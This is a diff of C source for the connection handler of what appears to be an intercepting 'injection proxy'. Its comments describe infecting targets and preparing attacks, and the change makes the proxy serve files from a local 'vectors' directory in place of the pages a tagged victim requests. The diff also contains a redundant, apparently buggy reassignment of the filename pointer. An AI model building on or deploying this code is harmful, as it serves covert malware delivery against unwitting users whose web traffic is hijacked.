@@ -88,6 +88,7 @@ MY_THREAD_FUNC(handle_connection)
 {
    BIO *cbio = MY_THREAD_PARAM; // client bio
    BIO *sbio = NULL; // server bio
+   FILE *fl;
    struct sockaddr_in peer;
    int sock;
    socklen_t slen;
@@ -97,6 +98,7 @@ MY_THREAD_FUNC(handle_connection)
    int len, written;
    char *host, *tag, *th = NULL;
    char *url = NULL;
+   char *rsrc = NULL;
    char *p, *q;
    struct request_node *req;
    struct timeval tvs, tve, tvt;
@@ -172,12 +174,32 @@ MY_THREAD_FUNC(handle_connection)
          DEBUG_MSG(D_DEBUG, "URL: [%s]", url);
       }
 
+   /* extract file name from request */
+   SAFE_STRDUP(rsrc, url);
+   if ((p = strchr(rsrc, '?')) != NULL)
+      *p = 0; /* strip arguments */
+   if ((p = strrchr(rsrc, '/')) != NULL)
+      p = strrchr(rsrc, '/');
+
+
    /*
     * search the tag in the list.
-    *    - if we found it, we know how to infect the target
-    *    - if not found, do nothing and simply proxy the connection
+    *   - if we have a tag and a local file matching the request, then serve the local file
+    *   - if we have no local file and we have tag<->url association, we know how to infect the target
+    *   - if we have only a tag, do nothing and simply proxy the connection
+    *   - if we have no tag, then close the connection preventing the use of IPA as open proxy
     */
-   if ((req = request_find(tag, url)) != NULL) {
+
+   if ((req = request_find_tag(tag)) != NULL &&
+      p && strlen(++p) && /* file name has a length */
+      (fl = open_data("vectors", p, FOPEN_READ_BIN)) != NULL) { /* check if the file is local to "vectors" */
+         DEBUG_MSG(D_INFO, "Serving local file: [%s]", p);
+
+         /* read from the file & close the handle */
+         proxy_replace(&cbio, &sbio, p, req->tag, host);
+         fclose(fl);
+   }
+   else if ((req = request_find(tag, url)) != NULL) {
       DEBUG_MSG(D_INFO, "Connection from target [%s][%s], preparing the attack...", tag, url);
 
       switch (req->type) {
@@ -213,37 +235,13 @@ MY_THREAD_FUNC(handle_connection)
       }
 
    } else if ((req = request_find_tag(tag)) != NULL) {
-      FILE *lf;
-      char *p;
-
       DEBUG_MSG(D_ERROR, "Tag found [%s], proxying the connection to [%s]...", tag, url);
       /*
        * no request was matched, but a tag was found
        * we have to remove it and proxy the connection
        */
       mangle_request(request, request_end);
-
-      /* check if the file is local to "vectors"
-       * if it is present, serve it and don't ask to the real server
-       */
-      if ((p = strrchr(url, '/')) != NULL) {
-         /* check if the client is requesting a file */
-         if (strlen(p + 1) &&             /* the filename has a length */
-             !strpbrk(p + 1, "&?%=") &&   /* the file is not a for request/post */
-             ((lf = open_data("vectors", p + 1, FOPEN_READ_BIN)) != NULL)) {
-            DEBUG_MSG(D_INFO, "Serving local file: [%s]", p + 1);
-            /* read from the file */
-            proxy_replace(&cbio, &sbio, p + 1, req->tag, host);
-            /* close the handle */
-            fclose(lf);
-         } else {
-            /* the file is not local, proxy the connection to the real server */
-            proxy_null(&cbio, &sbio, request);
-         }
-      } else {
-         /* the file is not local, proxy the connection to the real server */
-         proxy_null(&cbio, &sbio, request);
-      }
+      proxy_null(&cbio, &sbio, request);
    } else {
       DEBUG_MSG(D_ERROR, "No known tag found, terminating the connection... [%s]", url);
       /*
@@ -294,6 +292,7 @@ close_connection:
    /* free the memory */
    SAFE_FREE(th);
    SAFE_FREE(url);
+   SAFE_FREE(rsrc);
 
    DEBUG_MSG(D_INFO, "End connection [%d] [%d.%d seconds]", BIO_get_fd(cbio, NULL), tvt.tv_sec, tvt.tv_usec);
 
